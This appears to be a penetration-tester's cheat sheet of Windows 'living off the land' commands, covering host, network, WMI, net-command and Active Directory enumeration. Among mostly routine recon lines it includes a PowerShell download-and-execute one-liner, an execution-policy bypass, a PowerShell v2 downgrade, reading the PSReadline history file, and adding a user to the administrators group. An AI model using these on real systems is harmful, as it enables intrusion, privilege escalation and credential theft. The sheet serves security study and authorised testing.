# Living Off the Land

### 1. Basic Enumeration Commands (CMD)

```cmd
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
systeminfo
```

### 2. PowerShell Enumeration

```powershell
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"
powershell.exe -version 2
Get-MpComputerStatus
qwinsta
```

### 3. Network Enumeration

```cmd
arp -a
route print
netsh advfirewall show allprofiles
```

### 4. Windows Management Instrumentation (WMI)

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

### 5. Net Commands

```cmd
net accounts
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group "Domain Controllers" /domain
net group <domain_group_name> /domain
net groups /domain
net localgroup
net localgroup administrators /domain
net localgroup Administrators
net localgroup administrators [username] /add
net share
net user <ACCOUNT_NAME> /domain
net user /domain
net user %username%
net use x: \\computer\share
net view
net view /all /domain[:domainname]
net view \\computer /ALL
net view /domain
net1
```

### 6. Dsquery Enumeration

```cmd
dsquery user
dsquery computer
```
